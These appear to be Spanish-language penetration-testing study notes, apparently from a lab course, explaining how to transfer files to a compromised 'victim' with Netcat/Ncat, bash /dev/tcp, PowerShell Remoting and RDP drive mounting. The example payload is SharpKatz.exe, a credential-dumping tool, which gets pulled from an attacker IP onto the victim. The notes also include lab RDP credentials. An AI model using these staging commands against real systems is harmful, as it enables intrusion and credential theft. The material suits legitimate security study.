- Netcat (nc): herramienta para leer/escribir en conexiones TCP/UDP.
- Ncat: versión moderna de Netcat, soporta SSL, IPv6, proxies, cierre de conexión controlado.
- Se puede usar tanto en Linux como Windows para enviar o recibir archivos.
- Útil cuando firewalls bloquean ciertas conexiones: se puede escuchar o conectarse desde cualquier extremo.

#### Escenario básico.
Queremos transferir el archivo SharpKatz.exe

- **Establecer la conexión** es TCP, técnicamente bidireccional.
- **La transmisión del archivo en estos comandos es unidireccional**, de quien envía a quien recibe.
## A. NETCAT - NCAT. Envío de archivos 

Ambos métodos (Método 1 y Método alternativo, son para que la máquina víctima reciba un archivo).
### Método 1: Víctima escucha, atacante envía
- **Escucha / recibe:** Víctima / máquina comprometida
- **Envía:** Host atacante

**Máquina víctima (recibe el archivo):**
```
nc -l -p 8000 > SharpKatz.exe
```
o
```
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

**Host atacante (envía el archivo):**
```
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
o 
```
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

La víctima solo tiene que abrir un puerto y esperar la conexión.  
Útil cuando la víctima puede aceptar conexiones entrantes y no hay firewall bloqueando el puerto.
### Método alternativo
- **Escucha / envía:** Host atacante (envía el archivo cuando la víctima se conecta)
- **Conecta / recibe:** Máquina víctima (recibe y guarda el archivo)

Útil cuando hay un firewall bloqueando conexiones entrantes en la víctima, pero la víctima puede iniciar conexiones salientes hacia el atacante.

Atacante, envía el archivo cuando la máquina se conecta. 
```
sudo nc -l -p 443 -q 0 < SharpKatz.exe    # Netcat 
sudo ncat -l -p 443 --send-only < SharpKatz.exe   # Ncat
```
Víctima recibe el archivo y lo guarda.
```
nc 192.168.49.128 443 > SharpKatz.exe    # Netcat 
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe   # Ncat
```

- Solo **el extremo que tiene el archivo abierto como entrada (`< SharpKatz.exe`)** envía datos.
- El otro extremo solo **recibe y guarda** (`> SharpKatz.exe`).
- La conexión TCP es bidireccional en teoría, pero en estos comandos la **transferencia de archivos es unidireccional**.


# B. Transferencia de archivos con Netcat/Ncat y /dev/tcp
Cuando la máquina víctima / receptora no tiene Netcat/ncat:
**1. Envío de archivo desde host atacante**:
- Con Netcat (original):
```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
- Con Ncat:
```
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

- `-l -p 443` → escuchar en el puerto 443.
- < SharpKatz.exe → archivo que se enviará.
- -q 0 (Netcat) o --send-only (Ncat) → cierra la conexión al terminar de enviar el archivo.
- Este extremo (el atacante) es el que envía datos.
**2. Recepción de archivo desde la víctima / máquina comprometida**:
La víctima / receptora ejecuta:
```
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```
- cat < /dev/tcp/\<host>/\<port> → abre una conexión TCP al host y puerto indicados y lee los datos que llegan.    
- > SharpKatz.exe → guarda los datos recibidos en un archivo local.
- Este extremo es el que recibe y guarda el archivo.

# C. PowerShell Session File Transfer

PowerShell Remoting / WinRM permite ejecutar comandos o scripts en un equipo remoto desde PowerShell.
- Útil para transferir archivos cuando HTTP, HTTPS o SMB no están disponibles.
- Por defecto, crea **listeners** en:
    - TCP 5985 → HTTP
    - TCP 5986 → HTTPS

Como requisitos, debemos cumplir uno de estos:
- Debemos tener sesión como ADMIN.
- Debemos ser miembro del grupo Remote Management Users o tener permisos explícitos de PowerShell Remoting.
- PowerShell Remoting debe estar habilitado en ambos equipos.

Escenario del caso:
- Máquina local (host atacante / administrador): DC01
- Máquina remota (objetivo / víctima):** DATABASE01
- Usuario: htb\administrator en DC01, que también tiene privilegios administrativos en DATABASE01.
- Objetivo: transferir archivos entre DC01 y DATABASE01 usando PowerShell Remoting, sin depender de HTTP, HTTPS o SMB.

1. **Paso 1: Cumplir requisitos iniciales:**
Antes de transferir archivos, debemos asegurarnos de que podemos conectarnos al puerto WinRM del equipo remoto:
```
# Usuario y host actual
whoami         
hostname       
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Obteniendo como respuestas:

```powershell-session
PS C:\htb> whoami
htb\administrator

PS C:\htb> hostname
DC01

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

TcpTestSucceeded : True → indica que la conexión TCP al puerto WinRM funciona correctamente.

2. **Paso 2: Creación de sesión remota**:
Creamos una **sesión PowerShell remota** hacia DATABASE01:
```
$Session = New-PSSession -ComputerName DATABASE01
```

- `$Session` almacena la conexión remota.
- No necesitamos especificar credenciales si nuestro usuario tiene privilegios administrativos en el remoto.

**3. Paso 3: transferencia de archivos**:

- **Desde DC01 a DATABASE01:**
Copiamos un archivo local hacia el escritorio del administrador en DATABASE01:
```
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
- -ToSession $Session → indica que enviamos el archivo a la sesión remota.
- -Destination → ruta en el remoto donde se guardará el archivo.

DATABASE01 **no “escucha” un puerto ni abre un programa especial**: simplemente PowerShell dentro de la sesión remota escribe el archivo donde le indicas.
Todo ocurre dentro de la **sesión de PowerShell Remoting**, usando el canal seguro de WinRM.

- **Desde DATABASE01 a DC01**:
```
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -FromSession $Session -Destination C:\
```
- -ToSession → envía archivos a la sesión remota.    
- -FromSession → trae archivos desde la sesión remota.
- La sesión remota **gestiona automáticamente la escritura/lectura de los archivos**; la máquina remota no necesita abrir puertos adicionales ni ejecutar nada extra.

# D. Transferencia de archivos con RDP (Remote Desktop Protocol)

## 1. Transferencia básica
- Con RDP en Windows, podemos **copiar y pegar archivos** entre el equipo local y la sesión remota.
- Simplemente: **copiar archivo en local → pegar en la sesión RDP**.

## 2. Desde Linux
- Se puede usar **xfreerdp** o **rdesktop** para conectarse a la sesión RDP. 
- Permiten copiar archivos desde la máquina remota a la sesión, aunque en algunos casos puede fallar.

## 3. Montar carpeta local en la sesión RDP
- Alternativa más confiable: **exponer una carpeta local como recurso de la sesión remota**.

Ejemplo con **rdesktop**:
```
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
- Ejemplo con **xfreerdp**:
```
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

- Una vez montada, la carpeta es accesible en Windows desde:
```
\\tsclient\linux
```

- `\\tsclient\` es el **punto de montaje que Windows crea automáticamente** para acceder a los discos locales del cliente RDP.
- Cada disco o carpeta que se exponga desde el cliente Linux aparece como un subdirectorio dentro de \\\tsclient\\.
- En nuestro ejemplo, como pusimos `linux`.
## 4. Desde Windows
- Usando **mstsc.exe** (cliente nativo de RDP) se pueden configurar **recursos locales**, incluyendo discos, impresoras y audio.
- La unidad seleccionada se vuelve accesible dentro de la sesión remota, permitiendo transferir archivos.

La carpeta montada **solo es accesible para tu sesión RDP**, otros usuarios de la máquina no pueden usarla. 
Ideal para **transferir archivos grandes o carpetas completas** sin depender de copiar y pegar.